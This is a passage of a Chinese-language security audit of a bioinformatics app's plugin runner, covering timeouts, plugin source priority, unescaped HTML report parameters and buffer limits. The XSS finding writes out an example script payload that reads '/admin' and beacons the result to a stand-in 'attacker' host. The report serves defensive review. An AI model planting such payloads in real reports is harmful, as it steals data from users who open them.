  - 用户运行 wgcna 10000×500 数据集时，单次 `blockwiseModules` 跑 10+ 分钟，timeout 触发 → R 进程被 SIGTERM，但 R 已分配的 4GB 内存不立即释放 → 用户多次重试后桌面 OOM。
  - 大 counts 矩阵（>5GB）时 deseq2 在 vst 阶段 OOM 崩溃，registry 收到 SIGKILL 而非 timeout，错误信息被截断。
- **建议修复方向**：
  - 把 timeout 改为可配置（plugin-tool-definition 提供 `estimatedMinutes`，registry 用 `Math.max(estimatedMinutes * 60 * 1000, 60000)` 派生）。
  - 用 `spawn` 替换 `execFile`，分离 `SIGTERM`（120% timeout）→ `SIGKILL`（140% timeout）的渐进式 kill。
  - 在 `executors` 层加 `getExecutor(language).memoryLimitMb` 字段，r-server 启动 R/Python 时用 `ulimit -v` 或环境变量传 memory cap。

---

### PL-008 [Minor] — Plugin sourceType 优先级在 development 模式下反转

- **严重度**：Minor
- **CVSS 3.1**：AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N ≈ 3.4
- **文件位置**：
  - `core/r-server/plugin-loader.js:629-674`（`loadPluginsFromSources` 合并规则）
- **代码示例**：

```629:674:core/r-server/plugin-loader.js
function loadPluginsFromSources({ builtInDir, installedDir, developmentDirs = [] } = {}) {
  const { inspectPluginSources } = require('../shared-backend/plugin-sdk');
  const sources = [];
  if (builtInDir) sources.push({ type: 'builtin', root: builtInDir });
  if (installedDir) sources.push({ type: 'installed', root: installedDir });
  for (const root of developmentDirs) sources.push({ type: 'development', root });
  const result = inspectPluginSources({ sources, normalizeManifest: normalizePluginManifest });
  const map = _getPluginsMap();
  for (const [id, plugin] of map.entries()) {
    if (plugin && plugin._fromSdkSource) map.delete(id);
  }
  for (const candidate of result.candidates) {
    if (!candidate.valid || !candidate.manifest) continue;
    const existing = map.get(candidate.manifest.id);
    const canonicalBuiltIn =
      candidate.sourceType === 'builtin' &&
      candidate.plugin &&
      candidate.plugin.sourcePolicy === 'builtin-canonical';
    if (
      existing &&
      !existing._fromSdkSource &&
      candidate.sourceType === 'builtin' &&
      !(canonicalBuiltIn && existing._sourceType !== 'development')
    ) {
      continue;
    }
    const currentFingerprint = candidate.manifest.execution.scriptFingerprint;
    const installedFingerprint = candidate.plugin._installedFingerprint || null;
    const manifestDrift = !!(
      installedFingerprint && currentFingerprint && installedFingerprint !== currentFingerprint
    );
    map.set(candidate.manifest.id, {
      ...candidate.plugin,
      id: candidate.manifest.id,
      pluginDir: candidate.pluginDir,
      scriptPath: path.join(candidate.pluginDir, 'scripts'),
      _sourceType: candidate.sourceType,
      ...
    });
  }
  return result;
}
```

- **现状**：
  - sources 数组顺序：builtIn → installed → development。
  - 合并规则里 `inspectPluginSources`（shared-backend/plugin-sdk.js）按 source 顺序逐个 candidate，新 candidate 总是覆盖 map 中的 entry。
  - 但 in-source 优先级**不显式记录**：第一个 candidate 写入 map 后，后续同 id 的 candidate 直接覆盖（line 660），没有 `_sourceType` 比较。
  - 当 developmentDir 与 builtInDir 含同名 plugin 时，development 后写但内置代码 line 651 的判断 `!existing._fromSdkSource` 在第一次 write 后才生效，第一次 write 实际是 builtin 覆盖 builtin（map.set 自身）。
- **风险**：
  - 开发者本地修改 builtin 插件脚本（resources/built-in-plugins/deseq2/scripts/deseq2.R）后，r-server 重启时 builtin source 优先写入，但 `loadBuiltInPlugins` 的 `if (existing && !(canonicalBuiltIn && existing._sourceType !== 'development'))` 保护 development 优先级。
  - 但 `loadPluginsFromSources` 没有这个保护——调用方如果传 developmentDirs，可能被 builtin 反覆盖。
- **建议修复方向**：
  - 显式 source priority：`{ builtin: 0, installed: 1, development: 2 }`，高分覆盖低分；canonical-builtin 例外。
  - 合并逻辑抽到 `shared-backend/plugin-sdk.js` 与 `plugin-loader.js` 共用一份。

---

### PL-009 [Minor] — 文本参数（如 `plot_title`）未转义进 HTML 报告

- **严重度**：Minor（仅 presentation 类参数，非科学参数）
- **CVSS 3.1**：AV:L/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N ≈ 4.0
- **文件位置**：
  - `resources/built-in-plugins/volcano-plot/scripts/volcano-plot.R:83,242-261`（有 html_escape 但 plot_title 未转义）
  - `resources/built-in-plugins/gene-correlation/scripts/gene-correlation.R`（无 html_escape）
  - `resources/built-in-plugins/deseq2/scripts/deseq2.R:413-417`（design 列名进入 HTML，无 escape）
- **代码示例（volcano-plot.R）**：

```242:261:resources/built-in-plugins/volcano-plot/scripts/volcano-plot.R
html_escape <- function(x) {
  x <- as.character(x)
  x <- gsub("&", "&amp;", x, fixed = TRUE)
  x <- gsub("<", "&lt;", x, fixed = TRUE)
  x <- gsub(">", "&gt;", x, fixed = TRUE)
  x <- gsub('"', "&quot;", x, fixed = TRUE)
  x
}
top_rows <- head(classified[order(-abs(classified$log2FoldChange), classified$significance), ], 12)
top_gene_rows_html <- paste(apply(top_rows, 1, function(row) {
  paste0(
    "<tr>",
    "<td>", html_escape(row[["gene"]]), "</td>",  // ← gene 转义了
    ...
    "<td><span class=\"badge badge-", tolower(html_escape(row[["sig"]])), "\">", html_escape(row[["sig"]]), "</span></td>",
    "</tr>"
  )
}), collapse = "\n")
```

但 plot_title:

```83:83:resources/built-in-plugins/volcano-plot/scripts/volcano-plot.R
plot_title <- if (is.character(plot_title) && length(plot_title) == 1) substr(plot_title, 1, 120) else "Volcano Plot"
```

然后：

```182:186:resources/built-in-plugins/volcano-plot/scripts/volcano-plot.R
labs(
  ...
  title = plot_title  // ← ggplot title 是 SVG/PNG 元数据，不进 HTML，没问题
)
```

vs deseq2 的 design 列名:

```413:417:resources/built-in-plugins/deseq2/scripts/deseq2.R
report_html <- gsub("{{DESIGN}}", design_col, report_html, fixed = TRUE)  // ← design_col 没转义
report_html <- gsub("{{REF}}", ref, report_html, fixed = TRUE)             // ← ref 没转义
report_html <- gsub("{{TREAT}}", treat, report_html, fixed = TRUE)         // ← treat 没转义
```

- **现状**：
  - volcano-plot 在 ggplot 层用 plot_title（不进 HTML），但 row 渲染有 html_escape。
  - deseq2 的 `design_col` / `ref` / `treat` 是用户输入（tool-definition `type: text`），直接 `gsub` 进 HTML 模板。
  - gene-correlation 完全没有 html_escape。
- **风险**：
  - 攻击者构造 `contrast_ref = "<script>fetch('/admin').then(r=>r.text()).then(t=>navigator.sendBeacon('https://attacker', t))</script>"` → deseq2 写出包含恶意脚本的报告 HTML。
  - 报告 HTML 在 desktop app 内通过 webview 渲染 → stored XSS。
  - 实际攻击面取决于报告的渲染上下文（Electron webview 默认 sandbox，但若 webview 配置 `nodeIntegration: true` 则危险）。
- **建议修复方向**：
  - deseq2 / gene-correlation 增加 `html_escape()` 包装所有文本参数再 `gsub` 进 HTML。
  - 在 registry 的 output artifact truth 层加 lint——所有 `*.html` 输出必须做 HTML 安全性检查（script tag / on* attribute）。

---

### PL-010 [Minor] — maxBuffer 单一 10MB，stdout/stderr 截断可能丢诊断信息

- **严重度**：Minor
- **CVSS 3.1**：AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N ≈ 2.7
- **文件位置**：
  - `core/r-server/mcp/registry.js:1362`（`maxBuffer: 10 * 1024 * 1024`）
- **代码示例**：

```1359:1365:core/r-server/mcp/registry.js
execFile(
  runCmd[0],
  runCmd.slice(1),
  { timeout: 300000, maxBuffer: 10 * 1024 * 1024, env: runEnv },
  async (err, stdout, stderr) => { ... }
);
```

```1395:1396:core/r-server/mcp/registry.js
stderr: String(stderr || '').slice(-2000),
stdout: String(stdout || '').slice(-2000),
```

- **现状**：
  - maxBuffer 10MB 是 stdout + stderr 共用上限。
  - 出错时取 stderr/stdout 末尾 2000 字符写 `failureResult.failure.stderr/stdout`。
  - 但 maxBuffer 溢出时 execFile 直接以 `ERR_CHILD_PROCESS_STDIO_MAXBUFFER` 失败，stderr 自身不可读。
- **风险**：
  - WGCNA 在网络矩阵密集场景下，R 的 print 输出可能 >10MB（每个 hub gene 打一行 metadata），maxBuffer 溢出 → 错误信息只能从 registry 的 `err.message` 拿 `"stdout maxBuffer length exceeded"`，不显示具体 R 错误。
  - agent 在 retry 时拿不到 R 真正错误原因，陷入死循环。
- **建议修复方向**：
  - 改为 `stdio: ['ignore', 'pipe', 'pipe']` + `process.stdout.on('data', append-to-file)` 模式，stdout/stderr 直接写 `jobDir/stdout.log` / `jobDir/stderr.log`，无内存上限。
  - maxBuffer 仅保留给"小输出快速失败"的场景，把选择交给 plugin-tool-definition 声明 `streamOutput: boolean`。

---

## 4. 附录 A：grep 全表

### 4.1 Tool definition 入口

| 路径 | 行数 | 角色 |
| ---- | ---- | ---- |
| `src/mcp-server.js` | 70 | desktop stdio server，把 `listTools` / `callTool` 桥接到 core/r-server/mcp/registry |
| `core/r-server/mcp/registry.js:940` | `listTools()` | 收集所有 plugin tool defs（含 skill/branch/IDE） |
| `core/r-server/mcp/registry.js:1677` | `callTool(name, args, opts)` | 入口，路由 skill/branch/ide/plugin |
| `core/r-server/mcp/registry.js:1052` | `_runPluginScript` | 调 R/Python 脚本的私有函数 |
| `core/r-server/mcp/registry.js:1359` | `execFile` | 唯一执行点（300s + 10MB） |
| `core/r-server/plugin-loader.js:395` | `listToolsForMCP()` | 把 `_petriPlugins` 转 MCP 格式 |
| `core/r-server/plugin-loader.js:376` | `_inputsToInputSchema()` | Petri inputs[] → JSON Schema（仅展示，不验证） |

### 4.2 Schema 声明字段（grep 汇总）

字段类别统计（grep `tool-definition.json`）：
- `inputs[]`：71 个（11 个插件）
- `outputs[]`：66 个
- `failureModes[]`：64 个（其中 5 个来自 GLOBAL_ARTIFACT_FAILURE_MODES 的 plugin-loader 合并）
- `resultStudio.entity`：8 个插件（deseq2 / volcano-plot / gene-correlation / go-kegg 4 个；wgcna/gsea/expression-qc/sample-metadata-validator/deg-standardizer/pca-explorer 6 个**没有**）
- `resultStudio.parameterImpacts`：4 个插件
- `resultStudio.validator.checks[]`：4 个插件

### 4.3 风险函数调用汇总（grep）

```bash
$ grep -rE 'system|shell|exec|popen' resources/built-in-plugins/*/scripts/
# → 0 个插件脚本调用 shell/subprocess

$ grep -rE 'download\.file|requests\.|http|GET|POST|urlretrieve|urllib|fetch' resources/built-in-plugins/*/scripts/
# → 仅 gsea.R / go-kegg.R 通过 R KEGGREST 包（依赖 RCurl/libcurl）做 HTTP GET
#   有 offline snapshot fallback（find_petri_kegg_snapshot）

$ grep -rE 'sqlite|dbExecute|dbGetQuery|dbWriteTable' resources/built-in-plugins/*/scripts/
# → 0 个（插件脚本不直连 SQLite，DB 由 r-server 调度层管理）
```

### 4.4 Plugin 风险维度矩阵

| Plugin | FS read (input) | FS write (output) | 子进程 exec | 网络出站 | SQLite 写 | secret/token |
| ------ | ---------------- | ------------------ | ----------- | -------- | --------- | ------------ |
| deseq2 | ✅ CSV/TSV | ✅ PNG/PDF/CSV/HTML/RDS | ❌ | ❌ | ❌ | ❌ |
| volcano-plot | ✅ CSV | ✅ PNG/SVG/PDF/CSV/HTML | ❌ | ❌ | ❌ | ❌ |
| gene-correlation | ✅ CSV | ✅ PNG/CSV | ❌ | ❌ | ❌ | ❌ |
| pca-explorer | ✅ CSV | ✅ PNG/PDF/CSV | ❌ | ❌ | ❌ | ❌ |
| go-kegg | ✅ CSV | ✅ PNG/PDF/CSV/HTML/RDS | ❌ | ⚠️ KEGG REST fallback | ❌ | ❌ |
| gsea | ✅ CSV | ✅ PNG/PDF/CSV/HTML/RDS | ❌ | ⚠️ KEGGREST（offline 优先） | ❌ | ❌ |
| wgcna | ✅ CSV/TSV | ✅ PNG/PDF/CSV/HTML/RDS | ❌ | ❌ | ❌ | ❌ |
| sample-metadata-validator | ✅ CSV/TSV | ✅ CSV/JSON/HTML | ❌ | ❌ | ❌ | ❌ |
| expression-qc | ✅ CSV/TSV | ✅ CSV/PNG/JSON/HTML | ❌ | ❌ | ❌ | ❌ |
| deg-standardizer | ✅ CSV/TSV | ✅ CSV/JSON/HTML | ❌ | ❌ | ❌ | ❌ |

### 4.5 隔离/沙箱边界汇总

| 边界 | 实现 | 文件位置 |
| ---- | ---- | -------- |
| Plugin input id 白名单 | `/^[A-Za-z0-9][A-Za-z0-9._-]*$/` + `isSafeFlatFilename` | `core/r-server/mcp/registry.js:1025-1028` |
| Staged filename 安全 | `isSafeFlatFilename(name) && !isInternalArtifactName(name)` | `core/r-server/mcp/registry.js:1030-1034` |
| Staged path 越界检测 | `path.dirname(stagedPath) !== root` | `core/r-server/mcp/registry.js:1035-1039` |
| Job layout 解析 | `_resolveMcpJobLayout`（project sandbox 或 global `tool-jobs/`） | `core/r-server/mcp/registry.js:1135-1161` |
| Script 执行目录 | `setwd(jobDir)` 后 fromJSON 读 `params.json` | `volcano-plot.R:21`, `gene-correlation.R:28` |
| Script 写入目录 | `file.path(job_dir, "output")` 或 jobDir 根（两种约定并存） | `deseq2.R:47-48`, `volcano-plot.R:226` |
| Runtime timeout | `execFile timeout: 300000` (5min) | `core/r-server/mcp/registry.js:1362` |
| Runtime buffer | `execFile maxBuffer: 10MB` | `core/r-server/mcp/registry.js:1362` |
| Runtime env | `R_LIBS_USER` 注入 pluginDir/packages/r | `core/r-server/mcp/registry.js:1347-1348` |
| 资源限制（memory/CPU） | ❌ 未实现 | — |

---

## 5. 附录 B：与既有 4 份报告的交叉引用

| 既有报告 | 与本审计重叠 | 本审计补充 |
| -------- | ------------ | ---------- |
| **agent-harness-security-audit-2026-08-17.md** | S-001（plugin RCE capability 边界） | PL-001（schema 校验）/ PL-003（数值边界）/ PL-004（file path 跨目录） |
| **agent-harness-security-audit-2026-08-17.md** | S-002 ~ S-018（IPC/sender/路径白名单/PTY/secret） | 不重复 |
| **agent-harness-contract-audit-2026-08-17.md** | MCP IDE 工具的 4 处描述偏差 | 本审计**不**重复 IDE 工具（`ide_*`）契约 |
| **agent-harness-contract-audit-2026-08-17.md** | Branch/Result IPC 三层漂移 | 不重复 |
| **agent-harness-error-handling-audit-2026-08-17.md** | failureMode 漂移（推测覆盖 PL-002） | PL-002/PL-005/PL-006：明确给出 7 个插件的 `failureModes.detect` regex 漂移点 + 4 处 manifest.files 漂移 |
| **agent-harness-architecture-audit-2026-08-17.md** | sourceType 优先级（推测覆盖 PL-008） | PL-008：给出 plugin-loader.js:629-674 的具体合并规则漏洞 |
| **agent-harness-architecture-audit-2026-08-17.md** | plugin-loader 与 registry 双源（推测） | 本审计完整给出 `_petriPlugins: Map` 三源合并规则 |

---

## 6. Top-3 ROI 修复建议

1. **PL-001（MCP callTool 入口 inputSchema 校验）** — 影响所有 10 个插件，**改动集中**（registry.js 一个函数 + Ajv 引入），阻断 prompt-injection 通过数值越界操纵科学结论的攻击路径。
2. **PL-004（file path 跨目录边界统一）** — 把"绝对路径 vs staged 副本"双轨改为统一 staged，相对路径由 registry 在 callTool 入口重写。改动相对局部（registry.js:1175-1202 + 各 R 脚本 `read.csv(params$xxx_path)` → 读 staged 副本）。
3. **PL-003 + PL-005（数值 boundary + runtime_not_ready 协议）** — 同步 `resultStudio.parameters` 的 minimum/maximum 到顶层 inputs[]；runtime_not_ready 改为 `stop()` 走 exit 1 路径而非写空 manifest。改动集中在 tool-definition.json 与脚本 60-100 行，无需改 registry。

---

## 7. 审查边界声明

- 本审计**不**评判 Provider / GA 公证 / packaged-only 阶段事项。
- 本审计**不**评判 plugin source policy 之外的 r-server HTTP 契约（已被 architecture-audit / contract-audit 覆盖）。
- 本审计**不**评判 Branch / Result Studio IPC 的 renderer 路径暴露问题（已被 contract-audit 覆盖）。
- 本审计仅做静态只读分析，不运行任何插件、不修改任何源文件、不写 `AUDIT-LOG.md`。
- 所有发现均**完全可在 G0 开发期内部修复**，不需要 Provider / GA 公证 / packaged-only 阶段事项。
